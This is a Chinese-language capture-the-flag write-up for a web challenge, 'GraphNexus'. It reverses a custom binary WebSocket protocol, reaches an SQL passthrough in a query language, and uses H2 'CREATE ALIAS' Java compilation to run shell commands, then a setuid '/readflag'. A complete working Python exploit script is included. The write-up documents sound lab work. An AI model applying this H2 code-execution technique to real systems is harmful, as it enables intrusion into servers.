# 1-3 GraphNexus — WP

- 类型：WEB
- 靶机：`nc/8080 -> 1.14.76.59:29984`（HTTP）
- 结果：**已解答**（分值 468.72）
- flag 内层：`66452616977567875156785634079052`
- 容器内文件：`/flag.txt` = `DASCTF{66452616977567875156785634079052}`

> 注意：平台只认**内层**（不带 `DASCTF{}`）。带壳提交会报「提交flag错误」。

## 1. 侦察

```
GET /            → 首页（GraphNexus，导航有 /dashboard /nodes /graph /query）
GET /api/v1/nodes   → 15 条知识节点（id/title/category/tags）
GET /api/v1/nodes/1 → 单条，含 content
GET /api/v1/search?q=Neural → 搜索结果（参数化，无注入）
```

`/query` 页面提示：

```
> Use WebSocket binary protocol to send queries.
> Endpoint: /ws/collab
```

附件 `problem.json` 泄露了设计意图：

```
WebSocket 协议级竞态条件
自定义 GSL 查询引擎注入
H2 Database CREATE ALIAS RCE
自定义二进制帧协议
```

## 2. 协议逆向前提

`/graph` 页面里的内联脚本直接给了协议定义（省了大量爆破）：

```js
// [MAGIC:4B][OPCODE:1B][LENGTH:4B][PAYLOAD:NB]
// MAGIC = 0x4E585553 ("NXUS")
// Opcodes: HELLO=1, AUTH=2, SUBSCRIBE=3, UPDATE=4,
//          QUERY=5, EXPORT=6, IMPORT=7, RESULT=8
```

服务端 banner：

```
NXUS | 01 | 00 00 00 5a | {"session":"nxs_...","protocol":"NexusFrame/2.3","encoding":"binary"}
```

### 关键坑：LENGTH 是**大端**

一开始用 `<I`（小端）构造，任何非空载荷都返回 `INVALID_FRAME`；
空载荷两种端序都是 0，所以只有“非空就失败”这一种表现，很容易误判成“载荷格式不对”。

改成 `>I` 后立刻正常，返回 `AUTH_REQUIRED`。

```python
def frame(op, payload):
    return b"NXUS" + bytes([op]) + struct.pack(">I", len(payload)) + payload
```

## 3. 认证流程

```
SUBSCRIBE (op=3, 空载荷)
  → {"subscribed":true,"token":"nxs_...","permissions":"read,query,export,import"}
QUERY (op=5, b"NODES.count")
  → {"result":15,"code":200}
```

即：**不需要额外 AUTH**，SUBSCRIBE 之后直接可以 QUERY（op=2 反而返回 `UNKNOWN_OPCODE`）。

## 4. GSL → SQL

空载荷的 QUERY 会返回命令提示：

```
{"error":"UNKNOWN_DSL_COMMAND","code":400,
 "hint":"Available: NODES.count, NODES.all, NODES.find(query), EDGES.count, SQL(query)"}
```

所以写法是 `SQL(<query>)`：

```
SQL(SELECT H2VERSION())  → {"result":[{"H2VERSION()":"2.2.224"}],"code":200}
```

### DSL 的两个坑

1. **单引号会被破坏**：`SQL(SELECT 'abc')` 报语法错误（H2 收到的是 `SELECT 'abc`，尾部引号丢了）。
   但 `CALL EXEC('id')` 可以——引号只在某些位置被吃掉。
2. **逗号会被当参数分隔**：`CHAR(73,78,...)` 在第一个逗号处截断。

→ 需要字符串字面量时，尽量放进 `CALL xxx('...')` 里；避免在 SQL 表达式中用 `CHAR(a,b,c)`。

## 5. H2 CREATE ALIAS RCE

H2 2.2.224 默认允许在 SQL 里编译 Java 源码。用 **`$$...$$` 美元引用**绕开单引号问题：

```sql
CREATE ALIAS EXEC AS $$
String exec(String cmd) throws Exception {
    java.util.Scanner s = new java.util.Scanner(
        Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd})
            .getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}
$$
```

返回 `{"result":{"affected":0},"code":200}`，随后：

```sql
CALL EXEC('id')
→ uid=1000(appuser) gid=1000(appuser)
```

验证编译能力可以先来一个最小函数：

```sql
CREATE ALIAS TESTF AS $$int f(int x) { return x + 1; }$$
CALL TESTF(41)  → 42
```

## 6. 提权与读 flag

```
CALL EXEC('ls -la /')
  -r-------- 1 root root 41 /flag.txt
  /readflag  ← setuid root
CALL EXEC('/readflag')
  → DASCTF{66452616977567875156785634079052}
```

容器是一个 K8s pod（`/proc/self/cgroup` 可见 kubepods），
应用以 `appuser` 运行，flag 由 setuid 的 `/readflag` 读取。

## 7. 提交

平台接口：

```
POST /slab-match/api/v1/player/answer-panel/answer
{"matchId":"1750","exerciseId":12063,"flag":"..."}
```

**带 `DASCTF{}` 提交被拒**（用了 5 次机会），去掉壳只提交内层 `66452616977567875156785634079052` 后通过。

```
分值：468.72    排名：648    状态：已解答
```

## 8. 复现脚本

| 文件 | 作用 |
|---|---|
| `work/1-3/ws_auth.py` | 协议握手 + SUBSCRIBE + 查询 |
| `work/1-3/h2_exec.py` | CREATE ALIAS + 执行命令 |
| `work/1-3/recon.py` | 容器侦察 |
| `work/1-3/h2_probe*.py` | 各阶段探测 |

最小复现：

```python
import asyncio, struct, websockets

def frame(op, p):
    return b"NXUS" + bytes([op]) + struct.pack(">I", len(p)) + p

async def main():
    async with websockets.connect("ws://TARGET/ws/collab") as ws:
        await ws.recv()                       # banner
        await ws.send(frame(3, b""))          # subscribe
        await ws.recv()
        src = ("String exec(String cmd) throws Exception { java.util.Scanner s = "
               "new java.util.Scanner(Runtime.getRuntime().exec("
               "new String[]{\"/bin/sh\",\"-c\",cmd}).getInputStream())"
               ".useDelimiter(\"\\\\A\"); return s.hasNext()?s.next():\"\"; }")
        await ws.send(frame(5, ("SQL(CREATE ALIAS EXEC AS $$" + src + "$$)").encode()))
        await ws.recv()
        await ws.send(frame(5, b"SQL(CALL EXEC('/readflag'))"))
        print(await ws.recv())

asyncio.run(main())
```

## 9. 时间线

| 时间 | 事件 |
|---|---|
| 10:07 | 拿到靶机地址，开始摸协议 |
| 10:20 | 小端帧全部 `INVALID_FRAME`，卡住 |
| 10:35 | 发现 `/graph` 内联脚本给了帧定义 |
| 10:40 | 换大端，`NODE.count` 通 |
| 10:42 | `SQL()` 通，确认 H2 2.2.224 |
| 10:45 | `CREATE ALIAS` + `$$` 编译成功，RCE |
| 10:47 | `/readflag` 读到 flag |
| 10:50 | 带壳提交被拒；去壳通过 |
